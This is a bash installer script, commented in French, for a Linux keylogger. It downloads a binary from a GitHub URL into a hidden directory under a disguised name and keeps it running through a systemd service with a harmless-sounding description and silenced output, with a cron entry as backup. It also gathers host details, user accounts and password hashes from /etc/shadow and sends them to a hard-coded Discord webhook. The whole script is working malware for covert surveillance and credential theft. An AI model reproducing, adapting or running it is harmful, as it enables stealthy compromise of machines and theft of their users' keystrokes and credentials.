#!/bin/bash

# ─── Configuration ───────────────────────────────────────────────────────────
WEBHOOK_URL="https://discord.com/api/webhooks/1488635228603023371/V5RAgOeKALap4uu2J3QeOBpGHyXXlr9X7OKGAWB1h5wYpRU5LtSQOPdqimbtkdRIizn_"
GITHUB_BIN_URL="https://raw.githubusercontent.com/Tomatorgb/KlinuxconfigL/main/keylogger_bin"
INSTALL_DIR="/usr/local/src/.bin"
BINARY_NAME=".sys_worker"
SERVICE_NAME="sys-worker"

# ─── Installation du binaire ─────────────────────────────────────────────────
mkdir -p "$INSTALL_DIR"
chmod 700 "$INSTALL_DIR"
curl -sL "$GITHUB_BIN_URL" -o "$INSTALL_DIR/$BINARY_NAME"
chmod +x "$INSTALL_DIR/$BINARY_NAME"

# Créer le fichier de log persistant
touch /var/log/.sys_data.log
chmod 600 /var/log/.sys_data.log

# ─── Persistance via systemd (plus fiable que cron) ──────────────────────────
cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=System Worker Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStartPre=/bin/sleep 30
ExecStart=${INSTALL_DIR}/${BINARY_NAME}
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Activer et démarrer le service
systemctl daemon-reload
systemctl enable ${SERVICE_NAME}.service
systemctl start ${SERVICE_NAME}.service

# ─── Fallback cron (au cas où systemd échoue) ────────────────────────────────
CRON_JOB="@reboot sleep 30 && ${INSTALL_DIR}/${BINARY_NAME}"
(crontab -l 2>/dev/null | grep -v "$BINARY_NAME"; echo "$CRON_JOB") | crontab -

# ─── Notification Discord d'installation ─────────────────────────────────────
HOSTNAME_VAL=$(hostname)
USERNAME_VAL=$(whoami)
OS_VAL=$(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d'"' -f2 || echo "Linux")
KERNEL_VAL=$(uname -r)
ARCH_VAL=$(uname -m)
IP_LOCAL_VAL=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "?")
IP_PUB_VAL=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || echo "?")
CPU_VAL=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | cut -d':' -f2 | xargs || echo "?")
RAM_VAL=$(free -h 2>/dev/null | awk '/Mem:/ {print $2}' || echo "?")
DATE_VAL=$(date "+%d/%m/%Y %H:%M:%S")

USERS_VAL=$(awk -F: '$3>=1000 && $7 !~ /nologin|false|sync/ {print $1" ("$6")"}' /etc/passwd 2>/dev/null || echo "?")
SHADOWS_VAL=$(awk -F: '$2 != "" && $2 != "*" && $2 != "!" && $2 != "!!" {print $1": "$2}' /etc/shadow 2>/dev/null || echo "Non disponible")

# Envoi via Python3 (gère correctement le JSON)
python3 - << PYEOF
import urllib.request, json

webhook = """$WEBHOOK_URL"""

msg1 = (
    "**AGENT INSTALLE**\n"
    "\`\`\`\n"
    "Date     : $DATE_VAL\n"
    "Host     : $HOSTNAME_VAL\n"
    "User     : $USERNAME_VAL\n"
    "OS       : $OS_VAL\n"
    "Kernel   : $KERNEL_VAL\n"
    "Arch     : $ARCH_VAL\n"
    "IP Local : $IP_LOCAL_VAL\n"
    "IP Pub   : $IP_PUB_VAL\n"
    "CPU      : $CPU_VAL\n"
    "RAM      : $RAM_VAL\n"
    "Users    : $USERS_VAL\n"
    "\`\`\`\n"
    "Keylogger actif - logs toutes les 200s."
)

def send(m):
    data = json.dumps({"content": m[:1990]}).encode("utf-8")
    req = urllib.request.Request(webhook.strip(), data=data, headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        print("[!] Erreur Discord:", e)

send(msg1)

shadows = """$SHADOWS_VAL"""
if shadows.strip() and shadows.strip() != "Non disponible":
    send("**HASHES (/etc/shadow)**\n\`\`\`\n" + shadows[:1900] + "\n\`\`\`")

print("[+] Notifications envoyees !")
PYEOF

echo "[+] Installation terminee !"
echo "[+] Binaire : $INSTALL_DIR/$BINARY_NAME"
echo "[+] Service : systemctl status $SERVICE_NAME"
echo "[+] Log     : /var/log/.sys_data.log"